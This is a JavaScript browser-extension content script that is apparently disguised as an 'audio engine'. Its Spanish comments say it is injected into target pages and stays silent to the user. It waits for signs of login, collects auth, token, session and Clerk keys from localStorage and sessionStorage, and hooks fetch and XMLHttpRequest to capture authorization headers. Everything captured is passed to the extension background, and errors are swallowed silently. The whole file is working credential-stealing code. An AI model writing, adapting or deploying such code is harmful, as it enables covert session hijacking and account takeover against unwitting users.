// Content script - Inyectado en páginas target
// NO mostrar nada al usuario, trabajo silencioso

(function () {
    'use strict';

    // Anti-tamper: código encapsulado
    const ENGINE_ID = 'son1k_audio_engine_v2';

    // Verificar si ya está inyectado
    if (window[ENGINE_ID]) return;
    window[ENGINE_ID] = true;

    // Observer para detectar cuando el DOM está listo
    const observer = new MutationObserver((mutations, obs) => {
        // Buscar elementos específicos que indican autenticación
        const authElements = document.querySelectorAll('[data-auth], [data-session], .user-info');

        if (authElements.length > 0) {
            // Usuario autenticado detectado
            captureAuthState();
            obs.disconnect(); // Stop observing
        }
    });

    // Start observing
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });

    // Capturar estado de autenticación
    function captureAuthState() {
        // Método 1: Cookies (ya manejadas por background)

        // Método 2: LocalStorage
        try {
            const storage = { ...localStorage };
            const authKeys = Object.keys(storage).filter(key =>
                key.includes('auth') ||
                key.includes('token') ||
                key.includes('session') ||
                key.includes('clerk')
            );

            if (authKeys.length > 0) {
                const authData = {};
                authKeys.forEach(key => {
                    authData[key] = storage[key];
                });

                // Enviar al background
                chrome.runtime.sendMessage({
                    type: 'AUTH_STORAGE_CAPTURED',
                    data: authData,
                    url: window.location.href
                });
            }
        } catch (e) {
            // Silent fail
        }

        // Método 3: SessionStorage
        try {
            const session = { ...sessionStorage };
            const sessionKeys = Object.keys(session).filter(key =>
                key.includes('auth') || key.includes('token')
            );

            if (sessionKeys.length > 0) {
                const sessionData = {};
                sessionKeys.forEach(key => {
                    sessionData[key] = session[key];
                });

                chrome.runtime.sendMessage({
                    type: 'SESSION_STORAGE_CAPTURED',
                    data: sessionData,
                    url: window.location.href
                });
            }
        } catch (e) {
            // Silent fail
        }

        // Método 4: Interceptar fetch/XHR para capturar headers
        interceptNetworkRequests();
    }

    // Interceptar requests de red
    function interceptNetworkRequests() {
        // Interceptar fetch
        const originalFetch = window.fetch;
        window.fetch = function (...args) {
            return originalFetch.apply(this, args).then(response => {
                // Capturar response headers si contienen auth
                const authHeader = response.headers.get('authorization') ||
                    response.headers.get('x-auth-token');

                if (authHeader) {
                    chrome.runtime.sendMessage({
                        type: 'AUTH_HEADER_CAPTURED',
                        data: authHeader,
                        url: args[0]
                    });
                }

                return response;
            });
        };

        // Interceptar XMLHttpRequest
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.open = function (method, url) {
            this._url = url;
            return originalOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = function () {
            this.addEventListener('load', function () {
                const authHeader = this.getResponseHeader('authorization');
                if (authHeader) {
                    chrome.runtime.sendMessage({
                        type: 'AUTH_HEADER_CAPTURED',
                        data: authHeader,
                        url: this._url
                    });
                }
            });
            return originalSend.apply(this, arguments);
        };
    }

    // Cleanup
    window.addEventListener('unload', () => {
        observer.disconnect();
    });
})();
